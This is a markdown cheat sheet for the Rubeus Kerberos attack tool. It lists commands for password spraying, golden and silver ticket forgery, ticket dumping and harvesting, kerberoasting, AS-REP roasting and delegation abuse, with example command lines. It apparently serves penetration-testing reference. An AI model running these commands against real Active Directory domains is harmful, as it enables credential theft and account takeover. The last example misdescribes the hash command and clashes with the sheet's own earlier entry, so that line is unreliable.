### Author: https://github.com/GhostPack/Rubeus

### Commands:

#### asktgt = Request a ticket-granting-ticket (TGT) from a hash/key or password

#### asktgs = Request a service ticket from a passed TGT

#### renew = Renew or autorenew a TGT or service ticket

#### spray / brute = Kerberos-based brute-force, password spray attacks

#### preauthscan = Scan for accounts that don't require kerberos authentication (ASREPRoasting)

### Flags:

#### /user:USER

#### /HASH_ALGORITHM:HASH

#### /getcredentials

#### /certificate:CERTIFICATE

#### /password:PASSWORD

#### /dc:DOMAIN_CONTROLLER

#### /ptt (Pass-the-Ticket)

#### /domain:DOMAIN

#### /service:SERVICE

#### /ticket:BASE64_TICKET

#### /impersonateuser:USER

### TICKET FORGERY

#### golden = TGT

#### silver = Service ticket / TGS

#### diamond = Diamond ticket

### TICKET MANAGEMENT

#### ptt = Apply a ticket to the current (or specified) logon session

#### purge = Purge the session of Kerberos tickets

#### describe = Describe a ticket base64 blob or .kirbi file

### TICKET EXTRACTION AND HARVESTING

#### triage = LUID,username,service,service target,ticket expiration

#### klist = Detailed logon session and ticket info

#### dump = Detailed logon session and ticket data

#### tgtdeleg = Retrieve usable TGT for non-elevated user

#### monitor = Monitor logon events and dump new tickets

#### harvest = Same as monitor but with auto-renewal functionality

### ROASTING

#### kerberoast = Perform kerberoasting against all users (or specified)

#### asreproast = Perform AS-REP roasting against all users (or specified)

#### s4u = Perform S4U2self and S4U2proxy actions (Constrained delegation abuse)

### MISCELLANEOUS

#### createnetonly = Create a process of logon type 9

#### changepw = Aorato kerberos password reset

#### hash = Hash a plaintext password to kerberos encryption keys

#### tgssub = Substitute in alternative service names into a service ticket

#### logonsession = Display logon session info

#### currentluid = Display current user's LUID

### TECHNIQUES

#### 1) 

    Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] 

#### 2) 

    Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]

#### 3) 

    Rubeus.exe klist [/luid:LOGINID]

#### 4) 

    Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]

#### 5) 

    Rubeus.exe triage (List available tickets)

#### 6) 

    Rubeus.exe dump /luid:0x12d1f7 (Dump one ticket, the output is in Kirbi format)

#### 7) 

    Rubeus.exe renew /ticket:BASE64_TICKET (Renewing a ticket)

#### 8) 

    Rubeus.exe hash /ticket:BASE64_TICKET (Convert a ticket to hashcat format for offline cracking)
